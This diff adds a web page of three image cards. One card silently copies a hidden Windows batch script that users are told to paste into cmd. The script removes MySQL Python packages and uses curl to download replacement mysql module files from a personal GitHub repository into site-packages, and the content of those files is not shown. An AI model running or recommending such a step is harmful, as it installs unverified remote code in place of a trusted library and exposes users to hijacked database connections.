@@ -1,0 +1,199 @@
+<style>
+body {
+  margin: 0;
+  font-family: Inter, system-ui;
+  background: #f2f2f2 url("https://toppng.com/uploads/preview/noise-texture-png-transparent-with-clear-background-99391.png") repeat;
+  min-height: 100vh;
+  display: flex;
+  justify-content: center;
+  align-items: flex-end;
+  padding-bottom: 40px;
+}
+
+.wrap {
+  display: grid;
+  grid-template-columns: repeat(3, 350px);
+  gap: 30px;
+}
+
+.option {
+  width: 350px;
+  height: 584px;
+  border-radius: 14px;
+  overflow: hidden;
+  position: relative;
+  cursor: pointer;
+  transition: transform .25s ease, box-shadow .25s ease;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.18);
+}
+.option:hover {
+  transform: scale(1.03);
+  box-shadow: 0 12px 30px rgba(0,0,0,0.28);
+}
+
+.option img {
+  width: 100%;
+  height: 100%;
+  object-fit: cover;
+}
+
+#hoverPopup {
+  position: absolute;
+  background: white;
+  padding: 16px;
+  width: 260px;
+  border-radius: 10px;
+  box-shadow: 0 8px 25px rgba(0,0,0,0.20);
+  font-size: .95rem;
+  line-height: 1.35rem;
+  opacity: 0;
+  pointer-events: none;
+  transition: opacity .25s ease, transform .25s ease;
+  z-index: 999;
+  transform: translateY(10px);
+}
+#hoverPopup::after {
+  content: "";
+  position: absolute;
+  top: -8px;
+  left: 50%;
+  transform: translateX(-50%) rotate(45deg);
+  width: 16px;
+  height: 16px;
+  background: white;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+}
+
+#copyNotif {
+  position: fixed;
+  bottom: 40px;
+  right: 40px;
+  background: #111;
+  color: white;
+  padding: 14px 20px;
+  border-radius: 10px;
+  opacity: 0;
+  transform: translateY(20px);
+  transition: opacity .3s ease, transform .3s ease;
+  pointer-events: none;
+  font-size: 1rem;
+  box-shadow: 0 6px 20px rgba(0,0,0,0.25);
+}
+#copyNotif.show {
+  opacity: 1;
+  transform: translateY(0);
+}
+
+#copyOption textarea {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  opacity: 0;
+  cursor: pointer;
+}
+
+@media (max-width: 768px) {
+  body {
+    align-items: flex-start;
+    padding-top: 30px;
+  }
+
+  .wrap {
+    grid-template-columns: 1fr;
+    gap: 25px;
+  }
+
+  .option {
+    width: 90vw;
+    height: 460px;
+    margin: auto;
+  }
+}
+</style>
+
+<div class="wrap">
+  <div class="option" data-msg="This zip file contains record files for anyone to use. Just download and extract.">
+    <img src="https://raw.githubusercontent.com/Krasyguyyy/idk-man-for-my-website/main/imr.png">
+  </div>
+
+  <div class="option" data-msg="Copy the code to ChatGPT and say: 'Change the code to be something like YOUR TOPIC'. Replace the output if you want.">
+    <img src="https://raw.githubusercontent.com/Krasyguyyy/idk-man-for-my-website/main/imp.png">
+  </div>
+
+  <div class="option" id="copyOption" data-msg="Click to copy the MySQL connectivity installer script,and copy it to cmd.">
+    <img src="https://raw.githubusercontent.com/Krasyguyyy/idk-man-for-my-website/main/imc.png">
+    <textarea readonly>@echo off
+echo Removing old or conflicting MySQL-related modules...
+
+pip uninstall -y mysql-connector-python
+pip uninstall -y mysql.connector
+pip uninstall -y mysql-connector
+pip uninstall -y pymysql
+pip uninstall -y mysqlclient
+pip uninstall -y mysql
+pip uninstall -y mysql-connector-repackaged
+
+echo.
+echo Installing required dependencies...
+pip install pymysql cryptography
+
+echo.
+echo Creating mysql folder...
+set "TARGET=%LocalAppData%\Programs\Python\Python313\Lib\site-packages\mysql"
+mkdir "%TARGET%" 2>nul
+
+echo Downloading wrapper files...
+
+curl -L -o "%TARGET%\__init__.py" ^
+ https://raw.githubusercontent.com/Krasyguyyy/idk-man-for-my-website/main/__init__.py
+
+curl -L -o "%TARGET%\connector.py" ^
+ https://raw.githubusercontent.com/Krasyguyyy/idk-man-for-my-website/main/connector.py
+
+echo.
+echo Installation complete!
+echo Your wrapper is installed in:
+echo %TARGET%
+pause
+</textarea>
+  </div>
+</div>
+
+<div id="hoverPopup"></div>
+<div id="copyNotif">Command copied!</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const popup = document.getElementById("hoverPopup");
+  const options = document.querySelectorAll(".option");
+
+  // Hover messages
+  options.forEach(opt => {
+    opt.addEventListener("mouseenter", () => {
+      popup.textContent = opt.dataset.msg;
+      const rect = opt.getBoundingClientRect();
+      popup.style.left = rect.left + rect.width/2 - 130 + "px";
+      popup.style.top = rect.top - 100 + "px";
+      popup.style.opacity = "1";
+      popup.style.transform = "translateY(0)";
+    });
+    opt.addEventListener("mouseleave", () => {
+      popup.style.opacity = "0";
+      popup.style.transform = "translateY(10px)";
+    });
+  });
+
+  // Copy functionality for 3rd option
+  const copyOption = document.getElementById("copyOption");
+  const textarea = copyOption.querySelector("textarea");
+  copyOption.addEventListener("click", () => {
+    textarea.select();
+    document.execCommand("copy");
+    const notif = document.getElementById("copyNotif");
+    notif.classList.add("show");
+    setTimeout(() => notif.classList.remove("show"), 2500);
+  });
+});
+</script>
